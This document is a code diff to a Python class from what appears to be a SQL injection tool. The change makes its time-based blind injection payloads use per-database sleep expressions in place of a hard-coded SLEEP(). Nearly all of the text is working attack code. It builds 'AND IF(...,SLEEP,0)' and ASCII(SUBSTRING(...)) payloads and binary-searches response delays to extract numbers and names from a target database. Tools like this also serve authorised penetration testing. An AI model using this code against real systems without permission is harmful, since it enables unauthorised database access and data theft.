@@ -1,6 +1,6 @@
 from core.Analyzer import Analyzer
 from core.Requester import Requester
-from utils.constants import InjectionContext
+from utils.constants import InjectionContext, fingerprints
 
 
 class TimeInjector:
@@ -11,12 +11,17 @@ class TimeInjector:
     delay function causes the database to respond significantly slower.
     """
 
-    def __init__(self, requester: Requester, analyzer: Analyzer):
+    def __init__(self, requester: Requester, analyzer: Analyzer, sleep: float = 1.0):
         self.requester = requester
         self.analyzer = analyzer
+        self.sleep_expression = ""
+        self.sleep = sleep
 
     def test(
-        self, param: str, ctx: InjectionContext, sleep: float = 1.0
+        self,
+        database_engine: str,
+        param: str,
+        ctx: InjectionContext,
     ) -> bool:
         """
         Test for time-based SQL injection.
@@ -31,11 +36,18 @@ class TimeInjector:
 
         r_normal = self.requester.send({param: ctx.prefix + "AND 1=1" + ctx.suffix})
 
+        sleep_expression = fingerprints[database_engine.lower()].sleep
+        if sleep_expression is None:
+            return False
+
+        delay_expression = sleep_expression.format(seconds=self.sleep)
+        self.sleep_expression = delay_expression
+
         r_sleep = self.requester.send(
-            {param: f"{ctx.prefix}AND SLEEP({sleep}){ctx.suffix}"}
+            {param: f"{ctx.prefix}AND {delay_expression}{ctx.suffix}"}
         )
 
-        return self.analyzer.is_delayed(r_normal, r_sleep, sleep)
+        return self.analyzer.is_delayed(r_normal, r_sleep, self.sleep)
 
     def get_number_returned_by_sql(
         self,
@@ -43,7 +55,6 @@ class TimeInjector:
         ctx: InjectionContext,
         expression: str,
         high: int,
-        sleep: int = 1,
     ) -> int:
         """
         Find the number returned by a SQL query using time-based blind SQLi.
@@ -55,7 +66,7 @@ class TimeInjector:
 
         # Baseline request containing a condition that does not trigger a delay.
         r_baseline = self.requester.send(
-            {param: f"{ctx.prefix}AND IF(1=2,SLEEP({sleep}),0){ctx.suffix}"}
+            {param: f"{ctx.prefix}AND IF(1=2,{self.sleep_expression},0){ctx.suffix}"}
         )
 
         low = 0
@@ -65,15 +76,13 @@ class TimeInjector:
             mid = (low + high) // 2
 
             # If expression > mid is true, the database sleeps.
-            payload = (
-                f"{ctx.prefix}AND IF({expression}>{mid},SLEEP({sleep}),0){ctx.suffix}"
-            )
+            payload = f"{ctx.prefix}AND IF({expression}>{mid},{self.sleep_expression},0){ctx.suffix}"
 
             response = self.requester.send({param: payload})
 
             # A significant increase in response time means that
             # expression > mid evaluated to true.
-            if self.analyzer.is_delayed(r_baseline, response, sleep):
+            if self.analyzer.is_delayed(r_baseline, response, self.sleep):
                 low = mid + 1
             else:
                 high = mid
@@ -86,7 +95,6 @@ class TimeInjector:
         ctx: InjectionContext,
         expression: str,
         expr_name_len: int,
-        sleep: int = 1,
     ) -> str:
         """
         Return a database element's name using time-based blind SQLi.
@@ -101,7 +109,7 @@ class TimeInjector:
         # Non-delaying baseline. The condition is always false, so SLEEP()
         # is never executed.
         r_baseline = self.requester.send(
-            {param: f"{ctx.prefix}AND IF(1=2,SLEEP({sleep}),0){ctx.suffix}"}
+            {param: f"{ctx.prefix}AND IF(1=2,{self.sleep_expression},0){ctx.suffix}"}
         )
 
         for digit in range(1, expr_name_len + 1):
@@ -118,14 +126,14 @@ class TimeInjector:
                     f"{ctx.prefix}"
                     f"AND IF("
                     f"ASCII(SUBSTRING({expression},{digit},1))>{mid},"
-                    f"SLEEP({sleep}),0)"
+                    f"{self.sleep_expression},0)"
                     f"{ctx.suffix}"
                 )
 
                 response = self.requester.send({param: payload})
 
                 # Delayed response => tested condition is true.
-                if self.analyzer.is_delayed(r_baseline, response, sleep):
+                if self.analyzer.is_delayed(r_baseline, response, self.sleep):
                     low = mid + 1
                 else:
                     high = mid
@@ -140,7 +148,6 @@ class TimeInjector:
         ctx: InjectionContext,
         expression: str,
         range: list[int],
-        sleep: int = 1,
     ) -> list[str]:
         """
         Return characters at the specified indexes using time-based blind SQLi.
@@ -154,7 +161,7 @@ class TimeInjector:
 
         # Non-delaying baseline used for timing comparisons.
         r_baseline = self.requester.send(
-            {param: f"{ctx.prefix}AND IF(1=2,SLEEP({sleep}),0){ctx.suffix}"}
+            {param: f"{ctx.prefix}AND IF(1=2,{self.sleep_expression},0){ctx.suffix}"}
         )
 
         for digit in range:
@@ -171,14 +178,14 @@ class TimeInjector:
                     f"{ctx.prefix}"
                     f"AND IF("
                     f"ASCII(SUBSTRING({expression},{digit},1))>{mid},"
-                    f"SLEEP({sleep}),0)"
+                    f"{self.sleep_expression},0)"
                     f"{ctx.suffix}"
                 )
 
                 response = self.requester.send({param: payload})
 
                 # A delayed response means the condition evaluated to true.
-                if self.analyzer.is_delayed(r_baseline, response, sleep):
+                if self.analyzer.is_delayed(r_baseline, response, self.sleep):
                     low = mid + 1
                 else:
                     high = mid
